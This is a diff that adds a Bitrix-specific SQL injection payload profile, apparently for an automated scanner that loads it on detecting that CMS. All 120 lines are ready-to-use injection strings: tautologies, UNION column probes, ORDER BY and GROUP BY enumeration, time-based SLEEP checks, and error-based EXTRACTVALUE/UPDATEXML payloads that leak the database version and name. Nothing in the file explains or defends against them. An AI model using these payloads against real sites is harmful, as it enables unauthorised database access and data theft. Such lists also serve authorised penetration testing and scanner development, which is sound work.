@@ -1,0 +1,122 @@
+# bitrix CMS-specific SQL injection payload profile
+# Loaded automatically when CMS detector identifies Bitrix
+' OR '1'='1' /*bitrix_1*/
+' AND 1=2 UNION SELECT NULL-- bitrix_2
+' AND SLEEP(4)-- bitrix_3
+' OR IF(4=4,SLEEP(2),0)-- bitrix_4
+' UNION SELECT NULL,NULL,NULL-- bitrix_5
+' ORDER BY 7-- bitrix_6
+' GROUP BY 8 HAVING 1=1-- bitrix_7
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- bitrix_8
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- bitrix_9
+1 OR 1=1# bitrix_10
+-1 UNION SELECT NULL-- bitrix_11
+' OR 1=1-- bitrix_12
+' OR '1'='1' /*bitrix_13*/
+' AND 1=2 UNION SELECT NULL-- bitrix_14
+' AND SLEEP(1)-- bitrix_15
+' OR IF(16=16,SLEEP(2),0)-- bitrix_16
+' UNION SELECT NULL,NULL,NULL-- bitrix_17
+' ORDER BY 9-- bitrix_18
+' GROUP BY 4 HAVING 1=1-- bitrix_19
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- bitrix_20
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- bitrix_21
+1 OR 1=1# bitrix_22
+-1 UNION SELECT NULL-- bitrix_23
+' OR 1=1-- bitrix_24
+' OR '1'='1' /*bitrix_25*/
+' AND 1=2 UNION SELECT NULL-- bitrix_26
+' AND SLEEP(3)-- bitrix_27
+' OR IF(28=28,SLEEP(2),0)-- bitrix_28
+' UNION SELECT NULL,NULL,NULL-- bitrix_29
+' ORDER BY 1-- bitrix_30
+' GROUP BY 8 HAVING 1=1-- bitrix_31
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- bitrix_32
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- bitrix_33
+1 OR 1=1# bitrix_34
+-1 UNION SELECT NULL-- bitrix_35
+' OR 1=1-- bitrix_36
+' OR '1'='1' /*bitrix_37*/
+' AND 1=2 UNION SELECT NULL-- bitrix_38
+' AND SLEEP(5)-- bitrix_39
+' OR IF(40=40,SLEEP(2),0)-- bitrix_40
+' UNION SELECT NULL,NULL,NULL-- bitrix_41
+' ORDER BY 3-- bitrix_42
+' GROUP BY 4 HAVING 1=1-- bitrix_43
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- bitrix_44
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- bitrix_45
+1 OR 1=1# bitrix_46
+-1 UNION SELECT NULL-- bitrix_47
+' OR 1=1-- bitrix_48
+' OR '1'='1' /*bitrix_49*/
+' AND 1=2 UNION SELECT NULL-- bitrix_50
+' AND SLEEP(2)-- bitrix_51
+' OR IF(52=52,SLEEP(2),0)-- bitrix_52
+' UNION SELECT NULL,NULL,NULL-- bitrix_53
+' ORDER BY 5-- bitrix_54
+' GROUP BY 8 HAVING 1=1-- bitrix_55
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- bitrix_56
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- bitrix_57
+1 OR 1=1# bitrix_58
+-1 UNION SELECT NULL-- bitrix_59
+' OR 1=1-- bitrix_60
+' OR '1'='1' /*bitrix_61*/
+' AND 1=2 UNION SELECT NULL-- bitrix_62
+' AND SLEEP(4)-- bitrix_63
+' OR IF(64=64,SLEEP(2),0)-- bitrix_64
+' UNION SELECT NULL,NULL,NULL-- bitrix_65
+' ORDER BY 7-- bitrix_66
+' GROUP BY 4 HAVING 1=1-- bitrix_67
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- bitrix_68
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- bitrix_69
+1 OR 1=1# bitrix_70
+-1 UNION SELECT NULL-- bitrix_71
+' OR 1=1-- bitrix_72
+' OR '1'='1' /*bitrix_73*/
+' AND 1=2 UNION SELECT NULL-- bitrix_74
+' AND SLEEP(1)-- bitrix_75
+' OR IF(76=76,SLEEP(2),0)-- bitrix_76
+' UNION SELECT NULL,NULL,NULL-- bitrix_77
+' ORDER BY 9-- bitrix_78
+' GROUP BY 8 HAVING 1=1-- bitrix_79
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- bitrix_80
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- bitrix_81
+1 OR 1=1# bitrix_82
+-1 UNION SELECT NULL-- bitrix_83
+' OR 1=1-- bitrix_84
+' OR '1'='1' /*bitrix_85*/
+' AND 1=2 UNION SELECT NULL-- bitrix_86
+' AND SLEEP(3)-- bitrix_87
+' OR IF(88=88,SLEEP(2),0)-- bitrix_88
+' UNION SELECT NULL,NULL,NULL-- bitrix_89
+' ORDER BY 1-- bitrix_90
+' GROUP BY 4 HAVING 1=1-- bitrix_91
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- bitrix_92
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- bitrix_93
+1 OR 1=1# bitrix_94
+-1 UNION SELECT NULL-- bitrix_95
+' OR 1=1-- bitrix_96
+' OR '1'='1' /*bitrix_97*/
+' AND 1=2 UNION SELECT NULL-- bitrix_98
+' AND SLEEP(5)-- bitrix_99
+' OR IF(100=100,SLEEP(2),0)-- bitrix_100
+' UNION SELECT NULL,NULL,NULL-- bitrix_101
+' ORDER BY 3-- bitrix_102
+' GROUP BY 8 HAVING 1=1-- bitrix_103
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- bitrix_104
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- bitrix_105
+1 OR 1=1# bitrix_106
+-1 UNION SELECT NULL-- bitrix_107
+' OR 1=1-- bitrix_108
+' OR '1'='1' /*bitrix_109*/
+' AND 1=2 UNION SELECT NULL-- bitrix_110
+' AND SLEEP(2)-- bitrix_111
+' OR IF(112=112,SLEEP(2),0)-- bitrix_112
+' UNION SELECT NULL,NULL,NULL-- bitrix_113
+' ORDER BY 5-- bitrix_114
+' GROUP BY 4 HAVING 1=1-- bitrix_115
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- bitrix_116
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- bitrix_117
+1 OR 1=1# bitrix_118
+-1 UNION SELECT NULL-- bitrix_119
+' OR 1=1-- bitrix_120
